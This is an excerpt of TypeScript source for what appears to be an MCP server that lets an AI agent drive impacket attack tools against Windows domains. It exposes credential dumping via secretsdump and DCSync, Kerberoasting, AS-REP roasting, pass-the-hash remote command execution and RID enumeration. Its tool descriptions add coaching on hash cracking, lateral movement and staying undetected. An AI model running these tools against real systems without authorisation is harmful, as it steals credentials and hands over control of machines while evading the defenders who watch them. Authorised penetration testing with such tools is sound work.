...
function runTool(binary: string, toolArgs: string[]): Promise<{ content: Array<{ type: "text"; text: string }> }> {
    return new Promise((resolve, reject) => {
        const proc = spawn(binary, toolArgs);
        let output = "";
...
function buildTarget(host: string, username: string, password?: string, domain?: string): string {
    const creds = password ? `${username}:${password}` : username;
    return domain ? `${domain}/${creds}@${host}` : `${creds}@${host}`;
}

const server = new McpServer({ name: "impacket", version: "1.0.0" });

// ─── Tool 1: secretsdump ──────────────────────────────────────────────────────

server.tool(
    "impacket_secretsdump",
    `impacket MCP server — dump password hashes and secrets from Windows machines via secretsdump.
...
The NTHASH is what you use for pass-the-hash or hashcat -m 1000.`,
    {
        target: z.string().describe("Target IP or hostname (e.g., '10.0.0.1', 'dc01.corp.local')."),
        username: z.string().describe("Username with sufficient privileges (Domain Admin for DCSync, local admin for SAM dump)."),
        password: z.string().optional().describe("Password. Omit if using hashes for pass-the-hash."),
        domain: z.string().optional().describe("Domain name (e.g., 'corp.local'). Required for domain accounts."),
        hashes: z.string().optional().describe("NTLM hash for pass-the-hash in LMHASH:NTHASH format (e.g., 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'). Use instead of password."),
        dc_ip: z.string().optional().describe("Domain Controller IP. Required for domain targets to locate Kerberos/LDAP."),
        just_dc: z.boolean().optional().describe("Only dump domain credentials via DCSync (targets NTDS.dit on DC). Faster and less noisy than full dump. Use this when targeting a DC."),
        just_dc_ntlm: z.boolean().optional().describe("Only dump NTLM hashes from DC (skips Kerberos keys and cleartext). Use for a smaller, faster output."),
        output_file: z.string().optional().describe("Save hashes to this file (e.g., /data/dc_hashes.txt). Useful for piping into hashcat_crack."),
    },
    async ({ target, username, password, domain, hashes, dc_ip, just_dc, just_dc_ntlm, output_file }) => {
        const toolArgs: string[] = [];
        if (hashes) toolArgs.push("-hashes", hashes);
        if (dc_ip) toolArgs.push("-dc-ip", dc_ip);
        if (just_dc) toolArgs.push("-just-dc");
        if (just_dc_ntlm) toolArgs.push("-just-dc-ntlm");
        if (output_file) toolArgs.push("-outputfile", output_file);
...
server.tool(
    "impacket_kerberoast",
    `impacket MCP server — Kerberoasting: request TGS tickets for service accounts and output crackable hashes.
...
3. Use cracked credentials for lateral movement`,
    {
        ...
        username: z.string().describe("Any valid domain username — no special privileges needed."),
        password: z.string().optional().describe("Password. Omit if using hashes."),
        hashes: z.string().optional().describe("NTLM hash for pass-the-hash (LMHASH:NTHASH). Use instead of password."),
        dc_ip: z.string().describe("Domain Controller IP address."),
        output_file: z.string().optional().describe("Save TGS hashes to this file (e.g., /data/kerberoast.txt) for hashcat_crack input."),
        stealth: z.boolean().optional().describe("Request tickets one at a time (slower but less detectable). Default false — requests all at once."),
    },
    async ({ domain, username, password, hashes, dc_ip, output_file, stealth }) => {
        ...
        const toolArgs: string[] = [credential, "-dc-ip", dc_ip, "-request"];
        if (hashes) toolArgs.push("-hashes", hashes);
        if (output_file) toolArgs.push("-outputfile", output_file);
        if (stealth) toolArgs.push("-stealth");
...
server.tool(
    "impacket_asreproast",
    `impacket MCP server — AS-REP Roasting: get crackable hashes from accounts with Kerberos pre-authentication disabled.
...
3. hashcat_crack with hash_type=18200 → crack the hash`,
    {
        domain: z.string().describe("Active Directory domain name (e.g., 'corp.local')."),
        dc_ip: z.string().describe("Domain Controller IP address."),
        users_file: z.string().optional().describe("Path to file with usernames to test (one per line). Use kerbrute_userenum output. No credentials needed when using this."),
        username: z.string().optional().describe("Single username to test. Use users_file for bulk testing."),
        password: z.string().optional().describe("Password for authenticated enumeration (finds all vulnerable accounts automatically)."),
        hashes: z.string().optional().describe("NTLM hash for authenticated enumeration (LMHASH:NTHASH)."),
        output_file: z.string().optional().describe("Save AS-REP hashes to this file (e.g., /data/asrep.txt) for hashcat_crack input."),
        format: z.enum(["hashcat", "john"]).optional().describe("Output format for cracking. Default: hashcat (for hashcat -m 18200). Use 'john' for john_crack."),
    },
    async ({ domain, dc_ip, users_file, username, password, hashes, output_file, format }) => {
        ...
        if (users_file) toolArgs.push("-usersfile", users_file);
        else if (username) toolArgs.push("-usersfile", `/dev/stdin`);
        if (output_file) toolArgs.push("-outputfile", output_file);
...
server.tool(
    "impacket_exec",
    `impacket MCP server — execute commands on a remote Windows machine using valid credentials or NTLM hash.
...
- "dir C:\\Users" — list user profiles`,
    {
        target: z.string().describe("Target IP or hostname (e.g., '10.0.0.1', 'workstation01.corp.local')."),
        username: z.string().describe("Username with local admin rights on the target."),
        password: z.string().optional().describe("Password. Omit if using hashes for pass-the-hash."),
        domain: z.string().optional().describe("Domain name. Use '.' for local accounts."),
        hashes: z.string().optional().describe("NTLM hash for pass-the-hash (LMHASH:NTHASH). Powerful — no password needed, just the hash from secretsdump."),
        command: z.string().describe("Command to execute on the remote system (e.g., 'whoami', 'net user /domain', 'dir C:\\\\Users')."),
        exec_method: z.enum(["wmiexec", "psexec", "smbexec"]).optional().describe("Execution method. Default: wmiexec (stealthiest). Use psexec for older targets, smbexec as alternative."),
    },
...
server.tool(
    "impacket_lookupsid",
    `impacket MCP server — enumerate domain users, groups, and computers by brute-forcing RIDs via SMB.
...
- kerbrute: works over Kerberos, can run unauthenticated, returns only usernames`,
    {
        target: z.string().describe("Target IP or hostname (usually a DC or domain-joined machine)."),
        username: z.string().describe("Username for SMB authentication. Any domain user works."),
        password: z.string().optional().describe("Password. Omit if using hashes."),
        domain: z.string().optional().describe("Domain name (e.g., 'corp.local')."),
        hashes: z.string().optional().describe("NTLM hash for pass-the-hash (LMHASH:NTHASH)."),
        max_rid: z.number().optional().describe("Maximum RID to enumerate (default: 4000). Increase to 10000+ for large domains. Higher = more complete but slower."),
    },
    async ({ target, username, password, domain, hashes, max_rid }) => {
        const toolArgs: string[] = [];
        if (hashes) toolArgs.push("-hashes", hashes);
        toolArgs.push(buildTarget(target, username, password, domain));
        if (max_rid) toolArgs.push(max_rid.toString());
